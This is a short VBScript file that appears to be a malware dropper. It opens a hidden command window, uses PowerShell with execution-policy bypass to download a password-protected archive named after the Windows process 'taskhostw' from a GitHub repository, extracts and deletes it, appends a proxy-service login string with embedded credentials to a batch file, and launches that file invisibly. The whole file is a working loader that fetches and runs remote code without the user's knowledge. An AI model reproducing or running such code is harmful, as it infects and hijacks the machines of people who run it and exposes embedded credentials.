Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' Get current directory
currentDir = FSO.GetParentFolderName(WScript.ScriptFullName)

' Create batch command
batCommand = "cmd /c """ & _
    "cd /d """ & currentDir & """ && " & _
    "powershell -NoProfile -ExecutionPolicy Bypass -Command ""Invoke-WebRequest -Uri 'https://github.com/chop-pastel-cactuscnvn/sobsoba/raw/refs/heads/main/taskhostw4.7z' -OutFile 'taskhostw.7z' -UseBasicParsing"" && " & _
    """C:\Program Files\7-Zip\7z.exe"" x -aoa -p123 taskhostw.7z && " & _
    "del taskhostw.7z && " & _
    "echo user-stencil_yCHqE-country-US:IIL05um_1Rn+@dc.oxylabs.io:8000 -p %%STAMP%%-OXY ^>nul 2^>^&1 >> taskhostw.bat && " & _
    "start """" taskhostw.bat" & _
    """"

' Run hidden
WshShell.Run batCommand, 0, False

Set WshShell = Nothing
Set FSO = Nothing
